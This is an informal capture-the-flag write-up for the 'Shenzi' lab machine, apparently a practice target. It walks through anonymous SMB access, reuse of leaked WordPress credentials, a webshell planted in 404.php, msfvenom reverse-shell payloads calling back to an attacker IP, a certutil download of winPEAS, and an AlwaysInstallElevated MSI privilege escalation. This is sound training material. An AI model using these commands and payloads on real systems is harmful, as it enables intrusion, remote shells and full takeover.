Shenzi Writeup

Usual webserver so far

SMB is open we can run smbclient with no credentials to see if we can connect.
smbclient -U ''  -L \\\\192.168.131.55\\ 
After running the above command smbclient returns results showing a share called 'Shenzi'. We can connect to the share and then view the contents with the dir command.
smbclient -U ''  \\\\192.168.131.55\\Shenzi 

SMB 2 mode

Find user on anon login

try nopass on shenzi

in

>recurse
>prompt off
>mget *


### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357


Try opening the wordpress site by using shenzi after http://IP
	- then we try finding admin login by adding /wp-admin after shenzi

add a webshell to the 404.php jaunt

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.131 LPORT=21 -f exe > /home/kali/windows/reverseshell.exe

IMPORTANT: ALWAYS SUDO CHMOD 777 FILE BEFORE UPLOADING.

C:\Users\shenzi\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E24B-9BB9

 Directory of C:\Users\shenzi\Desktop

12/03/2021  08:56 AM    <DIR>          .
12/03/2021  08:56 AM    <DIR>          ..
12/03/2022  11:41 AM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,496,296,448 bytes free

C:\Users\shenzi\Desktop>type local.txt
type local.txt
cfd9b8c681c87f57f2008f5e2937d585


we're in now it is time to escalate privileges

lets try certutil to get the file for winpeas

certutil.exe -f -urlcache -split http://192.168.49.131/PEASS-ng
certutil.exe -f -urlcache -split http://192.168.49.131:1337/PEASS-ng
certutil.exe -f -urlcache -split http://192.168.49.131:1337/PEASS-ng/winPEAS
certutil.exe -f -urlcache -split http://192.168.49.131:80/winpeas.exe
SO ONE FILE WORKS ALSO PORT 80

try one to make the architecture work



jk just know the name of the file
also need to0 make sure you have write access to whatever directory you
are in.

The output we can leverage

���������͹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

����������͹ Drives Information
� Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 25 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])
    D:\ (Type: CDRom)

����������͹ Checking WSUS
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

����������͹ Checking KrbRelayUp
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system isn't inside a domain, so it isn't vulnerable


����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!


Hacktricks tells us we can simply execute a jaunt

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.131 LPORT=21 -f msi > /home/kali/priv.msi

download, start nc, execute

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E24B-9BB9

 Directory of C:\Users\Administrator

12/03/2021  08:30 AM    <DIR>          .
12/03/2021  08:30 AM    <DIR>          ..
12/03/2021  08:30 AM    <DIR>          3D Objects
12/03/2021  08:30 AM    <DIR>          Contacts
12/03/2021  08:55 AM    <DIR>          Desktop
12/03/2021  08:30 AM    <DIR>          Documents
12/03/2021  08:30 AM    <DIR>          Downloads
12/03/2021  08:30 AM    <DIR>          Favorites
12/03/2021  08:30 AM    <DIR>          Links
12/03/2021  08:30 AM    <DIR>          Music
12/03/2021  07:24 AM    <DIR>          OneDrive
12/03/2021  08:30 AM    <DIR>          Pictures
12/03/2021  08:30 AM    <DIR>          Saved Games
12/03/2021  08:30 AM    <DIR>          Searches
12/03/2021  08:30 AM    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  27,500,711,936 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
ad0613d1393df4cb45f954e0ed9eb0c7

